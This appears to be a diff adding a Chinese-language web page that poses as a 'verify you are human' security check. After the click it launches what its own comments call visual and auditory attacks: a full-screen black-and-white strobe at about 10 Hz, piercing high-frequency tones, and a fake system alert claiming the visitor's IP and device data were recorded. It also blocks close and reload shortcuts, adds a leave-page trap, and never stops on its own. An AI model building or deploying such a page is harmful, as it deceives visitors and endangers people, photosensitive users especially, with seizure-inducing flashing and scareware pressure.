@@ -1,0 +1,499 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>安全验证 - 请完成验证</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            width: 100vw;
+            height: 100vh;
+            overflow: hidden;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        /* 正常验证界面 */
+        .verification-card {
+            position: relative;
+            background: rgba(255,255,255,0.95);
+            border-radius: 24px;
+            padding: 40px 30px;
+            max-width: 420px;
+            width: 90%;
+            text-align: center;
+            box-shadow: 0 25px 50px rgba(0,0,0,0.3);
+            z-index: 1000;
+            transition: all 0.3s ease;
+        }
+
+        .icon {
+            font-size: 64px;
+            margin-bottom: 16px;
+        }
+
+        h2 {
+            color: #1a1a2e;
+            margin-bottom: 12px;
+            font-size: 24px;
+        }
+
+        .description {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 28px;
+            line-height: 1.5;
+        }
+
+        .verify-btn {
+            background: linear-gradient(135deg, #0f3460, #16213e);
+            color: white;
+            border: none;
+            padding: 14px 32px;
+            border-radius: 50px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+
+        .verify-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(0,0,0,0.2);
+        }
+
+        .security-badges {
+            margin-top: 24px;
+            font-size: 12px;
+            color: #888;
+            display: flex;
+            justify-content: center;
+            gap: 16px;
+        }
+
+        /* 视觉攻击层（初始隐藏） */
+        .strobe {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 9998;
+            pointer-events: none;
+            display: none;
+        }
+
+        /* 伪系统警告弹窗（初始隐藏） */
+        .fake-alert {
+            position: fixed;
+            top: 25%;
+            left: 10%;
+            right: 10%;
+            background: black;
+            color: red;
+            border: 3px solid red;
+            padding: 20px;
+            text-align: center;
+            font-size: 18px;
+            font-weight: bold;
+            z-index: 10000;
+            font-family: monospace;
+            box-shadow: 0 0 0 1000px rgba(0,0,0,0.7);
+            pointer-events: none;
+            display: none;
+            animation: glow 0.5s infinite alternate;
+        }
+
+        @keyframes glow {
+            from { text-shadow: 0 0 2px red; }
+            to { text-shadow: 0 0 12px red; }
+        }
+
+        .fake-alert small {
+            font-size: 11px;
+            color: #aa0000;
+        }
+
+        /* 攻击中提示条 */
+        .attack-warning {
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            right: 20px;
+            background: rgba(0,0,0,0.8);
+            color: #ff4444;
+            padding: 12px;
+            border-radius: 12px;
+            text-align: center;
+            font-size: 13px;
+            font-weight: bold;
+            z-index: 10002;
+            border: 1px solid #ff4444;
+            display: none;
+            font-family: monospace;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        /* 验证成功后的界面变化 */
+        .verification-card.attacking {
+            opacity: 0.3;
+            filter: blur(2px);
+            pointer-events: none;
+        }
+    </style>
+</head>
+<body>
+
+<!-- 视觉攻击层：高频黑白闪烁 -->
+<div class="strobe" id="strobeLayer"></div>
+
+<!-- 伪系统警告弹窗 -->
+<div class="fake-alert" id="fakeAlert">
+    ⚠️ 系统安全警告 ⚠️<br>
+    检测到异常访问行为<br>
+    <span style="font-size:12px;">您的IP及设备信息已被记录</span><br>
+    <small>此页面正在进行安全审计</small>
+</div>
+
+<!-- 攻击中提示 -->
+<div class="attack-warning" id="attackWarning">
+    🚨 安全验证已触发 - 系统正在扫描 🚨
+</div>
+
+<!-- 正常验证界面 -->
+<div class="verification-card" id="verificationCard">
+    <div class="icon">🛡️</div>
+    <h2>安全验证</h2>
+    <div class="description">
+        请确认您是真人用户，以继续访问本页面。<br>
+        点击下方按钮完成验证。
+    </div>
+    <button class="verify-btn" id="verifyBtn">✅ 点击验证我是真人</button>
+    <div class="security-badges">
+        <span>🔒 SSL 加密</span>
+        <span>🛡️ 安全防护</span>
+        <span>✓ 隐私保护</span>
+    </div>
+<p><img src="https://images.icon-icons.com/368/PNG/96/Warning_37097.png"></p>
+<p><img src="https://images.icon-icons.com/368/PNG/96/Warning_37097.png"></p>
+<p><img src="https://images.icon-icons.com/368/PNG/96/Warning_37097.png"></p>
+<p>你即将访问的网站可能不安全，请谨慎访问。</p>
+</div>
+
+<script>
+    (function() {
+        // ---------------- 视觉攻击：高频黑白闪烁 ----------------
+        let strobeInterval = null;
+        let isAttacking = false;
+        let currentColor = 'white';
+        const strobeLayer = document.getElementById('strobeLayer');
+        const EXTREME_INTERVAL = 50; // 50ms切换一次 = 10Hz闪烁频率
+        
+        function updateStrobe() {
+            if (!isAttacking) return;
+            if (currentColor === 'white') {
+                strobeLayer.style.backgroundColor = 'black';
+                currentColor = 'black';
+            } else {
+                strobeLayer.style.backgroundColor = 'white';
+                currentColor = 'white';
+            }
+        }
+        
+        function startStrobe() {
+            if (strobeInterval) clearInterval(strobeInterval);
+            strobeLayer.style.display = 'block';
+            strobeInterval = setInterval(updateStrobe, EXTREME_INTERVAL);
+        }
+        
+        function stopStrobe() {
+            if (strobeInterval) {
+                clearInterval(strobeInterval);
+                strobeInterval = null;
+            }
+            strobeLayer.style.backgroundColor = 'transparent';
+            strobeLayer.style.display = 'none';
+            currentColor = 'transparent';
+        }
+        
+        // ---------------- 听觉攻击：高频刺耳声音 ----------------
+        let audioContext = null;
+        let mainOscillator = null;
+        let mainGain = null;
+        let extraOscillator = null;
+        let extraGain = null;
+        let beepInterval = null;
+        let isSoundPlaying = false;
+        
+        function createHighPitchedSound() {
+            try {
+                if (audioContext && audioContext.state !== 'closed') {
+                    // 如果已存在，先关闭重建
+                    try { audioContext.close(); } catch(e) {}
+                }
+                audioContext = new (window.AudioContext || window.webkitAudioContext)();
+                
+                // 主振荡器：4400Hz 纯正弦波
+                mainOscillator = audioContext.createOscillator();
+                mainGain = audioContext.createGain();
+                mainOscillator.frequency.value = 4400;
+                mainOscillator.type = 'sine';
+                mainGain.gain.value = 0.35;
+                mainOscillator.connect(mainGain);
+                mainGain.connect(audioContext.destination);
+                
+                // 次振荡器：8800Hz 锯齿波
+                extraOscillator = audioContext.createOscillator();
+                extraGain = audioContext.createGain();
+                extraOscillator.frequency.value = 8800;
+                extraOscillator.type = 'sawtooth';
+                extraGain.gain.value = 0.2;
+                extraOscillator.connect(extraGain);
+                extraGain.connect(audioContext.destination);
+                
+                mainOscillator.start();
+                extraOscillator.start();
+                isSoundPlaying = true;
+                
+                // 周期性哔声干扰（每0.8秒）
+                beepInterval = setInterval(() => {
+                    if (!isSoundPlaying) {
+                        clearInterval(beepInterval);
+                        return;
+                    }
+                    try {
+                        if (!audioContext || audioContext.state === 'closed') return;
+                        const beepOsc = audioContext.createOscillator();
+                        const beepGain = audioContext.createGain();
+                        beepOsc.frequency.value = 4000;
+                        beepOsc.type = 'square';
+                        beepGain.gain.value = 0.4;
+                        beepOsc.connect(beepGain);
+                        beepGain.connect(audioContext.destination);
+                        beepOsc.start();
+                        beepGain.gain.exponentialRampToValueAtTime(0.00001, audioContext.currentTime + 0.2);
+                        beepOsc.stop(audioContext.currentTime + 0.2);
+                    } catch(e) {}
+                }, 800);
+                
+                // 恢复/启动音频上下文（需要用户交互，但验证按钮点击时会触发）
+                if (audioContext.state === 'suspended') {
+                    audioContext.resume();
+                }
+            } catch(e) {
+                console.warn("Web Audio API error:", e);
+            }
+        }
+        
+        function stopSound() {
+            isSoundPlaying = false;
+            try {
+                if (mainOscillator) {
+                    mainOscillator.stop();
+                    mainOscillator = null;
+                }
+                if (extraOscillator) {
+                    extraOscillator.stop();
+                    extraOscillator = null;
+                }
+                if (audioContext) {
+                    audioContext.close();
+                    audioContext = null;
+                }
+            } catch(e) {}
+            if (beepInterval) {
+                clearInterval(beepInterval);
+                beepInterval = null;
+            }
+            mainGain = null;
+            extraGain = null;
+        }
+        
+        // ---------------- UI 元素 ----------------
+        const verificationCard = document.getElementById('verificationCard');
+        const verifyBtn = document.getElementById('verifyBtn');
+        const fakeAlert = document.getElementById('fakeAlert');
+        const attackWarning = document.getElementById('attackWarning');
+        
+        // ---------------- 阻止快捷键/右键（攻击时启用） ----------------
+        let keyBlockActive = false;
+        
+        function enableBlockers() {
+            if (keyBlockActive) return;
+            keyBlockActive = true;
+            
+            // 禁用右键菜单
+            document.addEventListener('contextmenu', blockContextMenu);
+            // 阻止 Ctrl+W, Ctrl+F4, Alt+F4, Ctrl+R 等
+            document.addEventListener('keydown', blockShortcuts);
+        }
+        
+        function disableBlockers() {
+            keyBlockActive = false;
+            document.removeEventListener('contextmenu', blockContextMenu);
+            document.removeEventListener('keydown', blockShortcuts);
+        }
+        
+        function blockContextMenu(e) {
+            e.preventDefault();
+            return false;
+        }
+        
+        function blockShortcuts(e) {
+            if (!keyBlockActive) return;
+            const blocked = (e.ctrlKey && (e.key === 'w' || e.key === 'W' || e.key === 'r' || e.key === 'R')) ||
+                           (e.altKey && e.key === 'F4');
+            if (blocked) {
+                e.preventDefault();
+                showShortcutWarning();
+                return false;
+            }
+        }
+        
+        function showShortcutWarning() {
+            const warning = document.createElement('div');
+            warning.textContent = '⚠️ 安全模式下此快捷键已被禁用 ⚠️';
+            warning.style.position = 'fixed';
+            warning.style.bottom = '80px';
+            warning.style.left = '20px';
+            warning.style.right = '20px';
+            warning.style.background = 'black';
+            warning.style.color = 'red';
+            warning.style.padding = '10px';
+            warning.style.borderRadius = '8px';
+            warning.style.textAlign = 'center';
+            warning.style.zIndex = '20000';
+            warning.style.fontSize = '12px';
+            warning.style.fontFamily = 'monospace';
+            document.body.appendChild(warning);
+            setTimeout(() => warning.remove(), 1500);
+        }
+        
+        // ---------------- 开始攻击（验证后触发） ----------------
+        function startAttack() {
+            if (isAttacking) return;
+            isAttacking = true;
+            
+            // 视觉攻击
+            startStrobe();
+            
+            // 听觉攻击（需要用户交互才能播放，但验证按钮点击时已经有交互，所以可以播放）
+            createHighPitchedSound();
+            if (audioContext && audioContext.state === 'suspended') {
+                audioContext.resume();
+            }
+            
+            // 显示伪弹窗
+            fakeAlert.style.display = 'block';
+            
+            // 显示攻击提示条
+            attackWarning.style.display = 'block';
+            
+            // 启用快捷键/右键阻止
+            enableBlockers();
+            
+            // 让验证卡片变灰、模糊、不可交互（表示已被攻击覆盖）
+            verificationCard.classList.add('attacking');
+            
+            // 动态修改页面标题
+            let titleInterval = setInterval(() => {
+                if (!isAttacking) {
+                    clearInterval(titleInterval);
+                    document.title = '安全验证';
+                } else {
+                    document.title = '⚠️ 安全扫描中 - 请勿关闭 ⚠️';
+                }
+            }, 500);
+            window._titleInterval = titleInterval;
+            
+            // beforeunload 阻止关闭（攻击时）
+            window.addEventListener('beforeunload', beforeUnloadHandler);
+        }
+        
+        function beforeUnloadHandler(e) {
+            if (isAttacking) {
+                const message = '系统正在执行安全扫描，立即离开可能导致数据异常。确定要离开吗？';
+                e.returnValue = message;
+                return message;
+            }
+        }
+        
+        function stopAttack() {
+            if (!isAttacking) return;
+            isAttacking = false;
+            
+            stopStrobe();
+            stopSound();
+            fakeAlert.style.display = 'none';
+            attackWarning.style.display = 'none';
+            disableBlockers();
+            verificationCard.classList.remove('attacking');
+            
+            window.removeEventListener('beforeunload', beforeUnloadHandler);
+            if (window._titleInterval) clearInterval(window._titleInterval);
+            document.title = '安全验证已通过';
+        }
+        
+        // ---------------- 验证逻辑 ----------------
+        function onVerify() {
+            // 用户点击验证按钮后，开始攻击
+            // 先改变按钮状态防止重复触发
+            if (isAttacking) return;
+            
+            // 改变验证卡片内容，显示“验证中”
+            const originalBtnText = verifyBtn.textContent;
+            verifyBtn.textContent = '⏳ 验证中，请稍候...';
+            verifyBtn.disabled = true;
+            
+            setTimeout(() => {
+                // 验证完成 → 开始攻击！
+                startAttack();
+                
+                // 更新验证卡片内容，告知用户已被攻击（诱导后的真相）
+                verificationCard.querySelector('.icon').innerHTML = '🚨';
+                verificationCard.querySelector('h2').innerHTML = '验证已触发安全协议';
+                verificationCard.querySelector('.description').innerHTML = '您的验证行为已激活系统安全扫描。<br>请等待扫描完成（约30秒）或强制关闭页面。';
+                verifyBtn.textContent = '⚠️ 系统扫描中 ⚠️';
+                verifyBtn.disabled = true;
+                verifyBtn.style.opacity = '0.6';
+                
+                // 可选：30秒后自动停止攻击（演示用，实际可无限持续）
+                setTimeout(() => {
+                    if (isAttacking) {
+                        // 不自动停止，让用户自己体会，但为了演示不无限折磨，加个选项？
+                        // 这里不做自动停止，完全符合“验证后持续攻击”
+                    }
+                }, 30000);
+            }, 600);
+        }
+        
+        // 绑定验证按钮
+        if (verifyBtn) {
+            verifyBtn.addEventListener('click', onVerify);
+        }
+        
+        // 控制台警告
+        console.log('%c⚠️ 此页面为安全演示，验证后将触发视听检测⚠️', 'color: red; font-size: 16px;');
+        
+        // 初始化：无攻击状态
+        isAttacking = false;
+        strobeLayer.style.display = 'none';
+        fakeAlert.style.display = 'none';
+        attackWarning.style.display = 'none';
+    })();
+</script>
+</body>
+</html>
